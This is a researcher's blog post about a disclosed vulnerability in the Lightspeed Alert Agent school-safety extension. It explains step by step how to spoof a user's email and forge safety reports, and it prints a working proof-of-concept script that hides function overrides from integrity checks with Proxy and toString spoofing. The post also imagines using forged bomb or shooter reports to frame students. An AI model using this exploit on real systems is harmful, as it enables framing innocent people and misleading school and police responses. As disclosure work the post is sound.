+++
title = 'Forging School Safety Reports with Lightspeed Alert Agent'
date = 2025-05-02T03:32:32Z
draft = false
+++

# Forging School Safety Reports with Lightspeed Alert Agent

Two vulnerabilities in the same week! Lightspeed Alert Agent is software used in thousands of schools to detect suicide threats, violence, and criminal behavior like school shootings. This vulnerability, at the lowest level, is extremely simple. I can spoof someone else's email by hooking onto Chrome identity methods, and lie to the API to be some other user by giving the program a different email. Since the Chrome extension doesn't use a good way to authenticate users, chrome.identity is all you need to forge a report under someone else's name.

However, when you look at the bigger picture, it's the societal trust misplaced in vulnerable software that employs weak, unreliable security measures (at least, in my opinion) that makes this vulnerability so much more fun and dangerous. For example, an attacker could generate a shooter-related safety report under a principal's or a kid's email, triggering severe law enforcement involvement. Also, this blog contains some old doxr lore, I guess.

## TL;DR:

We can inject a secondary background script, ls_patcher.js, that runs before Lightspeed Alert Agent's main background script. This background script can overwrite certain Chrome methods to return data that allows us to spoof a target's email. This email is then used by the Chrome extension to craft a JWT, and the server doesn't do much verification on making sure the email isn't spoofed, once the JWT is confirmed to be valid.

The meat of the vulnerability lies in this function, which creates a Proxy object to override functions on important methods used by the extension like toString() to hide function modifications during integrity checks. It returns a different string representation of a function to make it appear as though it is native code, when it's actually not.

```js
function hideOverride(func, nativeFunc) {
  const proxy = new Proxy(func, {
    apply(target, thisArg, args) {
      return Reflect.apply(target, thisArg, args);
    }
  });

  Object.defineProperty(proxy, "toString", {
    value: function() {
      return `function ${nativeFunc.name || 'anonymous'}() { [native code] }`;
    },
    writable: false,
    configurable: false,
    enumerable: false
  });

  return proxy;
}
```

We can use this function to hide that the original functions (fetch, getManifest, getProfileUserInfo) have been modified, and send JWTs with target emails to the server, which will then create a safety report under the wrong person. Essentially, using function proxies and toString spoofing, you can bypass LS Alert's integrity checks, with a technique that should work for other extensions/apps too, when you need to spoof your environment details.

Administrators will probably completely trust the malicious report that the WASM makes, as there usually isn't anything "off" with the report, and this is why the vulnerability is more important than what the PoC makes it look like: this level of trust in Lightspeed Alert Agent, which is also used to identify potential BOMB THREATS and SCHOOL SHOOTERS, as well as suicidal people and cyberbullies, can get someone innocent in tons of trouble and potentially looked at by the feds. Or, if they realize that they're getting spammed by forged reports, actual reports could also get ignored, and this sort of desensitization could lead to problems.

## Doxr's Severeness Rating:

This is my favorite vulnerability because (you'll see if you keep reading), and because of how dangerous this is.

End Users affected: I asked ChatGPT to estimate:

> As of 2024, Lightspeed Alert is actively protecting over 5.7 million students across more than 1,500 school districts in the United States. This is part of Lightspeed Systems' broader reach, which encompasses over 23 million students across more than 5,000 districts globally. 

> These figures suggest that Lightspeed Alert is utilized in a significant portion of U.S. K–12 school districts. Given that there are approximately 13,000 public school districts in the U.S., this indicates that Lightspeed Alert is used in roughly 10–12% of districts. Considering the average district size and the widespread adoption of digital safety tools, it's reasonable to estimate that Lightspeed Alert serves a substantial number of students nationwide.

Doxr's Rating: 9.5/10

Why: The social implications are crazy, the potential for abuse is downright disgusting, and the trust in Lightspeed software would plummet.

## How it started

Being able to spoof reports using Lightspeed Alert Agent has been a goal since I started cybersecurity, about a year or so ago, which was back when I finally got past being a total programming beginner; even then, I understood that Lightspeed Alert Agent's system was weak. To better understand why, here's an explanation of the LS Alert system:

1. Extension starts, and the background script starts a WASM. This WASM is the heart of the extension, and is trusted with security through obscurity.
2. The WASM runs integrity checks: it checks core files like manifest.json, index.js (background script), and core methods such as chrome.runtime.getManifest and chrome.identity.getProfileUserInfo, all through `syscall/js` (it was built using Go, I think they used TinyGo to build the WASM)
3. Once deemed a secure environment, the WASM stores and uses your email through chrome.identity for telementary, safety reports, etc.
4. Some methods are internally opened (under the `window` scope, so not very internal), for the WASM's functionality. One is made to create and send a report. While it accepts stuff like your history and Chrome tabs and a screenshot of the page while typing the incriminating phrase, it uses the email that it got itself through chrome.identity (presumably as a security measure), and then...
5. Creates a JWT, with the payload using your email as the identifier. Just your email. Because of their dependence on security through obscurity, they sign the JWT with LOCAL data. I am still unsure where the JWT signing key can be found, but yes, it's competely local
6. It sends the JWT to the server, where the server validates a couple variables by ensuring you have an email in the JWT and a valid customer ID
7. When it's time to make a report, the background script initiates the report with the method to send a report and passes some data, such as recent tabs, history, and a screenshot; if we use `window.LSAlertWASM.SendReport` ourselves through devtools, we can send our own report data; of course, we can't control the target email solely based off this.

Based on just this, you probably saw some loose tape holding the system together:

- Security through obscurity (built WASM)
- Weak integrity checks
- Not enough validation regarding the environment
- Easy access to reporting manually (even though the report would fall under the email that the WASM initialized with)
- Literally using just the email as identification
- Not enough server validation (at least, in my opinion)
- JWT secret processed/created locally!!!
- The report can have information passed to it manually

## My Past Failures

Please keep in mind that this is even before Bromine35 (critical part of making me see the iceberg under the water regarding cybersec), and only played around with cybersecurity; I was very very new to this stuff (in fact, I hadn't even made a single Chrome extension at that time) and hadn't found any sort of vulnerability at all, except XSS in some chat sites that my friends made.

I assumed that the best way to spoof reports was to "decompile" the WASM with some tools and attempt to read through it as if it was just regular, readable code, and I assumed that the the local JWT secret would be easy to find. However, to my surprise, the decompiled "code" was tens of thousands of lines long, and completely unreadable. It would be absurd to attempt finding the JWT, but I tried for days (obviously not successfully) and even tried to get help from others by asking them to read it.

Anyways, it failed, and I continued on working with (and eventually witnessing the death of) Bromine35, and forgot about this.

## The Key (literally)

Almost a year and some more later, I remembered this and finally decided to try to do this again. I downloaded a new version of Lightspeed Alert Agent with this repo's dump's update URL:

https://github.com/Bromine35/LightspeedAlert-Dump

I remember that I got a random person's Lightspeed Alert Agent key off the internet (I didn't want to use mine, especially during testing), so I used their district's LS Alert product keys. The district wasn't affected by my testing whatsoever, as I used fake emails and testing phrases (Lightspeed includes some fake phrases that get flagged normally, but I assume the server treats them separately as it knows that they're testing phrases). 

As a side note, I found a private repo under the Bromine35 org with a future writeup for how the spoofer utility (I thought making a utility to spoof reports and open sourcing it WITHOUT REPORTING FIRST back then was a good idea) was going to work. I'm including this bit because the code, writeup, and the old PoC-in-progress was pretty funny to me.

## The Key (figuratively)

This time, I had a lot more experience pentesting, bug hunting, programming, and making Chrome extensions too. LS Alert used Manifest Version 2, which works by creating a background page and running background scripts by literally putting `<script>` items in the background HTML page, in the order that scripts are listed in the manifest file. This means that scripts that are FIRST in the list of background scripts run BEFORE the following scripts, which is great for me. If it was MV3, injecting the spoofer would have been MUCH more difficult, since you can only specify one script to run as a service worker, which has it's own context.

I decided to take a more more logical approach: since they depend so much on chrome.identity and their integrity checks, I would target the checks to spoof the user by changing the email that the report falls under. The rest of the report would be stuff I could control, and the WASM would cleanly create and send the JWT for me.

First, I tried the usual: hooking onto the chrome.identity methods to overwrite the email it sends with my own target email. However, the LS team obviously thought about that: they checked the manifest.json file for modifications. So then, I overwrote the window.fetch and chrome.runtime.getManifest methods to spoof the contents of manifest.json; however, this time, it was erroring with a different error number (the errors by themselves were competely useless and I had to guess the meaning of the error). This is when I realized my true challenge: overwriting the manifest and chrome.identity methods without triggering the WASM...

Until I realized it wasn't the true challenge, because I may have already solved this. A while back, I did almost the exact same thing: hiding that I hooked onto a method. I was able to almost cleanly rinse and recycle the function to hide that I overwrote the method, and this was the key to this vulnerability. I can spoof a function being native by overwriting it's toString() method, which is commonly used to check the integrity of a function. All I had to do was return a very standard string, and I did this through Proxy functions and redefining object properties of the function that was passed. And sure enough...

## It Worked

This time, when I started LS Agent and opened devtools, there were no errors from Lightspeed's WASM anymore. This was it: I bypassed their anti-tamper, and the WASM assumed it was in a secure environment. When I went to Google and searched up a bad test term that triggered a report, it actually sent a report that wasn't denied by the server for not having an email (I use a Chromium build with no account associated with the profile I used for testing, so chrome.identity would just return nothing). When I decoded the JWT with https://jwt.io, the payload reflected my FAKE email, which proves that it worked.

![pic of JWT](../../jwt.png)

## Making PoCs

By now, I was pretty much good to go; I bypassed their integrity checks, ran my own scripts, and spoofed a target. However, I wasn't done yet. I felt like I could go one step farther: we can control aspects of a report right? So what if I made another HTML file that imports the spoofer and then Lightspeed's `index.js` (essentially starts a second background process, sort of), and then manually crafts a report with window.LSAlertWASM.SendReport to further spoof reports by allowing the user to generate details of the report, for a target? And that became part 2 of my PoC, to demonstrate just how easy could be, while staying completely client-side.

![report generator](../../reportgen.png)

Of course, I couldn't "test" this in the sense of checking if the administrators see a valid, normal report, by actually forging a request and sending it on a real person's name. I would've been doing too much and probably would've just gotten myself in actual trouble.

## Reporting

I sent everything to Lightspeed, and at the end of it all, they said a couple things:

- The Alert Agent is outdated in terms of MV2 (I'm assuming this is because they don't want to allow the pre-background script injection)
- Their currently released agent version is safe (not sure if the server still accepts the forged requests, but I can't really check now because..)
- "Please also note that testing against Lightspeed Systems assets without prior written consent is not authorized. This policy is in place to safeguard our infrastructure and our customers from unintended consequences." so no more Lightspeed testing
- Since they "appreciate the professional and responsible way you handled this disclosure," they wanted to send Lightspeed Systems SWAG

Edit: I got it:

![report generator](../../swag.webp)

All of it was pretty cool, especially the Rambler and Lightspeed-branded Tile tag.

## PoC files

This is the main spoofer file, basically the main PoC:

```js
// ----------------------
// POC CONFIG

let target = "target@example.org"

// ----------------------

let bootmessage = "Lightspeed Alert Injection Loaded! Note: using this PoC actively changes sreport's email to a spoofed one."

alert(bootmessage)
console.log(bootmessage);

// --- MAIN VULNERABILITY - HIDE MODIFICATIONS ---
function hideOverride(func, nativeFunc) {
  const proxy = new Proxy(func, {
    apply(target, thisArg, args) {
      return Reflect.apply(target, thisArg, args);
    }
  });

  Object.defineProperty(proxy, "toString", {
    value: function() {
      return `function ${nativeFunc.name || 'anonymous'}() { [native code] }`;
    },
    writable: false,
    configurable: false,
    enumerable: false
  });

  return proxy;
}

// --- BACKUP ORIGINALS ---
const origManifest            = chrome.runtime.getManifest;
const origFetch               = window.fetch;
const origGetProfileUserInfo  = chrome.identity.getProfileUserInfo;

// --- CLONE & FILTER MANIFEST - HIDE FAKER ---
let manifestcontent = JSON.parse(JSON.stringify(origManifest()));
if (manifestcontent.background?.scripts) {
  manifestcontent.background.scripts =
    manifestcontent.background.scripts.filter(s => s !== "ls_patcher.js");
}
manifestcontent.update_url = "https://lsrelay-extensions-production.s3.amazonaws.com/alert/eedb52aa05122163d09e7943f4b0c461fa386bbed76634910d169aadd3b23a19/chrome/AlertAgentChrome.xml"

// --- OVERRIDE fetch TO SPOOF manifest.json IF NECESSARY ---
window.fetch = function(...args) {
  if (typeof args[0] === "string" && args[0].includes("manifest.json")) {
    return Promise.resolve(
      new Response(JSON.stringify(manifestcontent), {
        headers: { "Content-Type": "application/json" }
      })
    );
  }
  return origFetch(...args);
};

// --- OVERRIDE chrome.runtime.getManifest ---
chrome.runtime.getManifest = function() {
  return manifestcontent;
};

// --- OVERRIDE chrome.identity.getProfileUserInfo ---
chrome.identity.getProfileUserInfo = function(details, callback) {
  if (typeof details === "function") {
    callback = details;
  }
  callback({
    id:    "123456789012345678901",
    email: target
  });
};

// --- HIDE THE OVERRIDES ---
window.fetch                          = hideOverride(window.fetch, origFetch);
chrome.runtime.getManifest            = hideOverride(chrome.runtime.getManifest, origManifest);
chrome.identity.getProfileUserInfo    = hideOverride(chrome.identity.getProfileUserInfo, origGetProfileUserInfo);
```

The rest of the PoC files will probably be on some other repo later. As you can see, this mostly works because of the hideOverride.

## Conclusion

You can't depend on security through obscurity as the main way of securing your safety reports down. Just imagine what the wrong person could've done with this, if they really hated someone: they could anonymously tip about a bomb threat, leaving the school in panic, and then spoofing a student and making them spread bomb threats and spoofing a report under their name/email: the school would take it so absurdly serious that it's a bit scary to think about, especially if fake details were also included in the report (ex. the bomb was in the kid's lunchbox and he was going to blow it up at an assembly or something). Very dark, but it would be possible and easy to do. And nobody would know who did it or how, because the PoC only modifies the client; the server isn't of those who know (those who know:).

Depending on how you look at it, I took either a year and a half to find this or less than one day (as I said, I've already looked into method hooking and cloaking before, and it was extremely easy applying the exact same concepts here).

- doxr